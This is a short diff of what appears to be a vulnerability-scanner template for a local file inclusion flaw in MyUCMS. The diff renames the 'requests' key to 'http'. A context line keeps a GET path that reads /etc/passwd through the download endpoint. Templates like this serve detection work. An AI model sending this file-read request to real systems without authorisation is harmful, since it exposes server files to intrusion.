@@ -6,7 +6,7 @@ info:
   tags: myucms,lfi
   reference: https://blog.csdn.net/yalecaltech/article/details/104908257
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1"
